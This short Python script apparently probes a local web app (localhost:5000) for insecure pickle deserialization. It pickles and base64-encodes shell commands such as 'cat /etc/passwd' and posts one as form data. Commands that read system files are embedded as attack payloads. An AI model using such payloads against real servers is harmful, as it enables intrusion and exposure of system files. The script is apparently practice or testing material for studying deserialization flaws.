import pickle
import base64
import requests

# cmd = 'cat /etc/passwd'
# print('Comando a ser usado...: ', cmd)

# payload_pickle = pickle.dumps(cmd)
# print('Pickle do comando.....: ', payload_pickle)

# payload_base64=base64.b64encode(payload_pickle)
# print('Base64 do Pickle......: ', payload_base64)

def encodePayload(command):
    print('Comando a ser usado...: ', command)
    payload_pickle = pickle.dumps(command)

    payload_base64=base64.b64encode(payload_pickle)
    print('Base64 do Pickle......: ', payload_base64)
    
    return payload_base64

def teste():
    url = "http://localhost:5000/"
    payload = {'data': 'UydscyAvZXRjLycKcDAKLg=='}
    response = requests.post(url, data=payload)
    content = bytes.decode(response.content, 'utf-8')
    print(content)

encodePayload('cat /etc/passwd')
encodePayload('cat /etc/hosts')
encodePayload('ls /etc/')

teste()
